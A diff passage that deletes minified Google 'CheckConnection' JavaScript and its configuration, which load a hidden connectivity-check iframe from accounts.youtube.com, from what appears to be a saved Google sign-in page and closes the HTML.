-c.toLowerCase())return!1;c=(c=a.match(Gl)[3]||null)&&decodeURIComponent(c);if(!c||c.toLowerCase()!=d.toLowerCase())return!1;(d=Number(a.match(Gl)[4]||null)||null)||(d=Gm(f));return e==d};var Go=Go||new Gj("check_connection"),Gp="^([^:]+):(\\d*):(\\d?)$",Gq=null,Gr=null,Gs=null,Gt=function(a,b){this.c=a;this.b=b;this.a=!1};G=Gt.prototype;G.h=function(a,b){if(!b)return!1;if(0<=a.indexOf(","))return Go.error("CheckConnection result contains comma",[a]),!1;var c=b.value;b.value=c?c+","+a:a;return!0};G.d=function(a){return this.h(a,Gr)};G.j=function(a){return this.h(a,Gs)};G.i=function(a){a=a.match(Gp);return!a||3>a.length?null:a[1]};
-G.p=function(a,b){if(!Gn(this.c,a))return!1;if(this.a||!b)return!0;"accessible"==b?(this.d(a),this.a=!0):this.i(b)==this.b&&(this.j(b)||this.d(a),this.a=!0);return!0};G.m=function(){var a;a=this.c;var b="timestamp",c=String((new Date).getTime());if(0<a.indexOf("#"))throw Object("Unsupported URL Exception: "+a);return a=0<=a.indexOf("?")?a+"&"+encodeURIComponent(b)+"="+encodeURIComponent(c):a+"?"+encodeURIComponent(b)+"="+encodeURIComponent(c)};
-G.o=function(){var a=window.document.createElement("iframe"),b=a.style;b.visibility="hidden";b.width="1px";b.height="1px";b.position="absolute";b.top="-100px";a.src=this.m();a.id=this.b;Gq.appendChild(a)};
-var Gu=function(a){return function(b){var c=b.origin.toLowerCase();b=b.data;for(var d=a.length,e=0;e<d&&!a[e].p(c,b);e++);}},Gv=function(){if(window.postMessage){var a;a=window.__CHECK_CONNECTION_CONFIG.iframeParentElementId;var b=window.__CHECK_CONNECTION_CONFIG.connectivityElementId,c=window.__CHECK_CONNECTION_CONFIG.newResultElementId;(Gq=document.getElementById(a))?(b&&(Gr=document.getElementById(b)),c&&(Gs=document.getElementById(c)),Gr||Gs?a=!0:(Go.error("Unable to locate the input element to storeCheckConnection result",
-["old id: "+String(b),"new id: "+String(c)]),a=!1)):(Go.error("Unable to locate the iframe anchor to append connection test iframe",["element id: "+a]),a=!1);if(a){a=window.__CHECK_CONNECTION_CONFIG.domainConfigs;if(!a){if(!window.__CHECK_CONNECTION_CONFIG.iframeUri){Go.error("Missing iframe URL in old configuration");return}a=[{iframeUri:window.__CHECK_CONNECTION_CONFIG.iframeUri,domainSymbol:"youtube"}]}if(0!=a.length){for(var b=a.length,c=[],d=0;d<b;d++)c.push(new Gt(a[d].iframeUri,a[d].domainSymbol));
-Gd(window,"message",Gu(c));for(d=0;d<b;d++)c[d].o()}}}},Gw=function(){if(window.__CHECK_CONNECTION_CONFIG){var a=window.__CHECK_CONNECTION_CONFIG.postMsgSupportElementId;if(window.postMessage){var b=document.getElementById(a);b?b.value="1":Go.error("Unable to locate the input element to storepostMessage test result",["element id: "+a])}}};G_checkConnectionMain=Go.f(Gv);G_setPostMessageSupportFlag=Go.f(Gw);
-</script>
-  <script>
-  window.__CHECK_CONNECTION_CONFIG = {
-  newResultElementId: 'checkConnection',
-  domainConfigs: [{iframeUri: 'https://accounts.youtube.com/accounts/CheckConnection?pmpo\75https%3A%2F%2Faccounts.google.com\46v\75-190951695',domainSymbol: 'youtube'}],
-  iframeUri: '',
-  iframeOrigin: '',
-  connectivityElementId: 'dnConn',
-  iframeParentElementId: 'cc_i
+</body>
+</html>
